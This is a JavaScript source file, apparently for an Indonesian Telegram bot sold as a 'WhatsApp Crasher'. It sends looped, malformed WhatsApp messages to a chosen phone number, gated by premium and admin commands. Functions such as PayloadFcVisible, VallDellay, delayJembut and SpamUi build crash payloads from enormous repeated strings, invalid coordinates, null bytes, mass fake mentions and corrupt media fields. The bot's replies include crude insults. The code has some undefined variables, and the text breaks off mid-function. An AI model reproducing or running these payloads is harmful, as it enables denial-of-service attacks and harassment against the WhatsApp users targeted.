<b>Empir𝖾́ - Cràsher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Success
☇ Type: /Phantom
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, successCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🕊 Check° Target°", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null,
      `❌ Failed to send force.\n\n${err.message}`, {
        parse_mode: "Markdown"
      });
  }
});
/// -------- ( Case Bug ) -------- \\
bot.command("force", checkPremium, async (ctx) => {
  const userId = ctx.from.id.toString();
  const q = ctx.message.text.split(" ")[1];
  const date = getCurrentDate();
  
  if (!isWhatsAppConnected) {
  return ctx.reply("⚠️ WhatsApp belum terhubung! Gunakan /addpairing dulu.");
}

 if (!/^62\d{9,15}$/.test(q)) {
  return ctx.reply("❌ Nomor tidak valid! Gunakan /force  62xxx.");
}

  let isTarget = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true  

  const caption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process
☇ Type: /Delayinvis
☇ Date now: ${date}`;

  const sent = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ujr7p6.jpg" }, 
    {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      ...Markup.inlineKeyboard([
        [
          Markup.button.url("💐 sock° Info¿", "https://t.me/Verowxabout")
        ]
      ]), 
    }
  );

  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 200));
    const updatedCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process ${i}%
☇ Type: /Delayinvis 
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, updatedCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💐 informasi° script¿", url: "https://t.me/allinfoAkwayskyy" }
          ]
        ]
      }
    });
  }

  try {
  for (let i = 0; i < 20; i++) {    
    await PayloadFcVisible(target);
    await sleep(150);
  }

    const successCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Success
☇ Type: /Delayinvis
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, successCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🕊 Check° Target°", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null,
      `sock EROR.\n\n${err.message}`, {
        parse_mode: "Markdown"
      });
  }
});


bot.command("invisible", checkPremium, async (ctx) => {
  const userId = ctx.from.id.toString();
  const q = ctx.message.text.split(" ")[1];
  const date = getCurrentDate();
  
  if (!isWhatsAppConnected) {
  return ctx.reply("⚠️ WhatsApp belum terhubung! Gunakan /addpairing dulu.");
}

 if (!/^62\d{9,15}$/.test(q)) {
  return ctx.reply("❌ Nomor tidak valid! Gunakan /invisible  62xxx.");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true  

  const caption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process
☇ Type: /invisible
☇ Date now: ${date}`;

  const sent = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ujr7p6.jpg" }, 
    {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      ...Markup.inlineKeyboard([
        [
          Markup.button.url("💐 sock° Info¿", "https://t.me/Verowxabout")
        ]
      ])
    }
  );

  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 200));
    const updatedCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process ${i}%
☇ Type: /invisible 
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, updatedCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💐 informasi° script¿", url: "https://t.me/allinfoAkwayskyy" }
          ]
        ]
      }
    });
  }

  try {
  for (let i = 0; i < 40; i++) {    
    await VallDellay(sock, target);
    await sleep(200);
  }

    const successCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Success
☇ Type: /invisible
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, successCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🕊 Check° Target°", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null,
      `sock EROR.\n\n${err.message}`, {
        parse_mode: "Markdown"
      });
  }
});


bot.command("delayblank", checkPremium, async (ctx) => {
  const userId = ctx.from.id.toString();
  const q = ctx.message.text.split(" ")[1];
  const date = getCurrentDate();
  
  if (!isWhatsAppConnected) {
  return ctx.reply("⚠️ WhatsApp belum terhubung! Gunakan /addpairing dulu.");
}

 if (!/^62\d{9,15}$/.test(q)) {
  return ctx.reply("❌ Nomor tidak valid! Gunakan /delayblank  62xxx.");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true  

  const caption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process
☇ Type: /delayblank
☇ Date now: ${date}`;

  const sent = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ujr7p6.jpg" }, 
    {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      ...Markup.inlineKeyboard([
        [
          Markup.button.url("💐 sock° Info¿", "https://t.me/Verowxabout")
        ]
      ])
    }
  );

  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 200));
    const updatedCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process ${i}%
☇ Type: /delayblank 
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, updatedCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💐 informasi° script¿", url: "https://t.me/allinfoAkwayskyy" }
          ]
        ]
      }
    });
  }

  try {
  for (let i = 0; i < 15; i++) {    
    await delayJembut(sock, target);
    await sleep(300);
  }

    const successCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Success
☇ Type: /delayblank
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, successCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🕊 Check° Target°", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null,
      `sock EROR.\n\n${err.message}`, {
        parse_mode: "Markdown"
      });
  }
});


bot.command("Ui", checkPremium, async (ctx) => {
  const userId = ctx.from.id.toString();
  const q = ctx.message.text.split(" ")[1];
  const date = getCurrentDate();
  
  if (!isWhatsAppConnected) {
  return ctx.reply("⚠️ WhatsApp belum terhubung! Gunakan /addpairing dulu.");
}

 if (!/^62\d{9,15}$/.test(q)) {
  return ctx.reply("❌ Nomor tidak valid! Gunakan /Ui  62xxx.");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true  

  const caption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process
☇ Type: /Ui
☇ Date now: ${date}`;

  const sent = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ujr7p6.jpg" }, 
    {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      ...Markup.inlineKeyboard([
        [
          Markup.button.url("💐 sock° Info¿", "https://t.me/Verowxabout")
        ]
      ])
    }
  );

  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 200));
    const updatedCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process ${i}%
☇ Type: /Ui 
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, updatedCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💐 informasi° script¿", url: "https://t.me/allinfoAkwayskyy" }
          ]
        ]
      }
    });
  }

  try {
  for (let i = 0; i < 15; i++) {    
    await SpamUi(target, Ptcp = true);;
    await sleep(200);
  }

    const successCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Success
☇ Type: /Ui
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, successCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🕊 Check° Target°", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null,
      `sock EROR.\n\n${err.message}`, {
        parse_mode: "Markdown"
      });
  }
});


bot.command("blank", checkPremium, async (ctx) => {
  const userId = ctx.from.id.toString();
  const q = ctx.message.text.split(" ")[1];
  const date = getCurrentDate();
  
  if (!isWhatsAppConnected) {
  return ctx.reply("⚠️ WhatsApp belum terhubung! Gunakan /addpairing dulu.");
}

 if (!/^62\d{9,15}$/.test(q)) {
  return ctx.reply("❌ Nomor tidak valid! Gunakan /blank  62xxx.");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true  

  const caption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process
☇ Type: /blank
☇ Date now: ${date}`;

  const sent = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ujr7p6.jpg" }, 
    {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      ...Markup.inlineKeyboard([
        [
          Markup.button.url("💐 sock° Info¿", "https://t.me/Verowxabout")
        ]
      ])
    }
  );

  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 200));
    const updatedCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process ${i}%
☇ Type: /blank 
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, updatedCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💐 informasi° script¿", url: "https://t.me/allinfoAkwayskyy" }
          ]
        ]
      }
    });
  }

  try {
  for (let i = 0; i < 25; i++) {    
    await NewBlanks(target);
    await sleep(250);
  }

    const successCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Success
☇ Type: /blank
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, successCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🕊 Check° Target°", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null,
      `sock EROR.\n\n${err.message}`, {
        parse_mode: "Markdown"
      });
  }
});


bot.command("System", checkPremium, async (ctx) => {
  const userId = ctx.from.id.toString();
  const q = ctx.message.text.split(" ")[1];
  const date = getCurrentDate();
  
  if (!isWhatsAppConnected) {
  return ctx.reply("⚠️ WhatsApp belum terhubung! Gunakan /addpairing dulu.");
}

 if (!/^62\d{9,15}$/.test(q)) {
  return ctx.reply("❌ Nomor tidak valid! Gunakan /System  62xxx.");
}

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true  

  const caption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process
☇ Type: /System
☇ Date now: ${date}`;

  const sent = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ujr7p6.jpg" }, 
    {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      ...Markup.inlineKeyboard([
        [
          Markup.button.url("💐 sock° Info¿", "https://t.me/Verowxabout")
        ]
      ])
    }
  );

  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 200));
    const updatedCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process ${i}%
☇ Type: /System 
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, updatedCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💐 informasi° script¿", url: "https://t.me/allinfoAkwayskyy" }
          ]
        ]
      }
    });
  }

  try {
  for (let i = 0; i < 30; i++) {    
    await OverloadCursor(target, ptcp = true);
    await sleep(200);
  }

    const successCaption = `
<b>𝑬𝒍𝒂𝒊𝒏𝒂 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 - Crasher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Success
☇ Type: /System
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, successCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🕊 Check° Target°", url: `https://wa.me/${q}` }
          ]
        ]
      }
    });

  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null,
      `sock EROR.\n\n${err.message}`, {
        parse_mode: "Markdown"
      });
  }
});

/// ------- ( Plungins - khusus owner ) ------ \\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 526472198"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});

bot.command("addprem", checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 57305916"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ Kelaz Bocah Idiot ini ${userId} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ Kelaz Bocah Idiot ini ${userId} sudah memiliki status premium.`
  );
});
/// ------ ( Plungins - delete ) ------- \\\
bot.command("cekid", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const username = ctx.from.username || "Tidak ada username";

  const text = `🆔 Info Pengguna:
👤 Nama: ${ctx.from.first_name} ${ctx.from.last_name || ""}
📛 Username: @${username}
🆔 User ID: \`${userId}\`
💬 Chat ID: \`${chatId}\``;

  await ctx.reply(text, { parse_mode: "Markdown" });
});
  
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});



bot.command("delprem", checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem etmin🗿.`);
});



/// ------ ( case cek akses pengguna ) ------- \\\
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});



/// -------- ( case pairing code ) -------- \\\
bot.command("addpairing", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return await ctx.reply(
      "❌ Masukin nomor nya ngentot, Contoh nih mek /addpairing <nomor_wa>"
    );
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  
  if (sock && sock.user) {
    return await ctx.reply("Santai Masih Aman!! Gass ajaa cik...");
  }
  
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("💢 WhatsApp belum terhubung njirr, pairing dulu lah, /addpairing...");
    return;
  }
  next();
};

  try {
    const code = await sock.requestPairingCode(phoneNumber, "KIMOOODZ");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>N I H - C O D E 🦋</blockquote>
— 𝙆𝙤𝙙𝙚 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝘼𝙣𝙙𝙖...
╰➤ 𝙉𝙤𝙢𝙤𝙧  : ${phoneNumber} 
╰➤ 𝙆𝙤𝙙𝙚   : ${formattedCode}
`,

   parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });
  } catch (error) {
  
 console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing !"
    );
  }
});



/// ------ ( hendle close ) ------- \\\
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});



/// -------- ( case delete session ) -------- \\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("Session berhasil dihapus, Segera lakukan /restart lalu pairing kembali");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});


/// --------- ( FUNCTION BUG° START ) ---------- \\\
async function PayloadFcVisible(target) {
try {
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "You're beautiful៚",
              hasMediaAttachment: false,
            },
            body: {
              text: "You're beautiful៚",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "You're beautiful៚",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
     messageId: msg.key.id,
     participant: { jid: target },
    });

    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Lonte",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyIsHere៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await client.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });

    const messageVxzXinvis = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Anak Haram Kontol",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyNotWhyy👀".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: {
              text: "Hai Lontee😹",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Vxz.relayMessage(target, messageVxzXinvis, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}

async function VallDellay(sock, target) {
    const VallDellayewe = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: VallDellayewe,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: VallDellayewe,
                address: VallDellayewe
              }
            },
            body: { text: VallDellayewe },
            footer: { text: VallDellayewe },
            nativeFlowMessage: {
              messageParamsJson: VallDellayewe
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: VallDellayewe,
        footerText: VallDellayewe,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: VallDellayewe },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: VallDellayewe,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: VallDellayewe,
        title: VallDellayewe,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: VallDellayewe,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(VallDellayewe).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
        fileEncSha256: Buffer.from(VallDellayewe).toString("base64"),
        mediaKey: Buffer.from(VallDellayewe).toString("base64"),
        directPath: VallDellayewe,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await sock.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
    console.log(chalk.red("DONE SENDING BUG DELLAY BY VALL"));
}

async function delayJembut(sock, target) {
  try {
    const mentioned = [
       target,
      "0@s.whatsapp.net",
      ...Array.from({ length: 1998 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
    ];
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { 
              title: "\u0000",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "\u900A",
                address: "\u0007".repeat(20000)
                 },
                 hasMediaAttachment: true
                },
              body: { text: "\u0000" },
              contextInfo: {
                mentionedJid: mentioned,
                participant: target,
                remoteJid: "status@broadcast",
                isForwarded: true,
                forwardingScore: 9999,
                quotedMessage: {
                  extendedTextMessage: {
                    text: "ꦿꦷꦹ".repeat(15000),
                    contextInfo: {
                      mentionedJid: mentioned
                    }
                  }
                }
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "᬴".repeat(70000)
                    })
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "DOCUMENT",
                      flow_cta: "᬴".repeat(40000),
                      flow_message_version: "3"
                    })
                  }
                ],
                messageParamsJson: "[]".repeat(4000)
              }
            }
          }
        }
      },
      {}
    );
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
  }
}

async function SpamUi(target, Ptcp = true) {
    let AsepNotDev = "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁 饾悊廷饾悇饾悕 饾煇" + "軎�".repeat(250000) + "@8".repeat(250000);
    await asep.relayMessage(target, {
groupMentionedMessage: {
    message: {
interactiveMessage: {
    header: {
documentMessage: {
    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    fileLength: "999999999",
    pageCount: 0x9184e729fff,
    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    fileName: "Wkwk.",
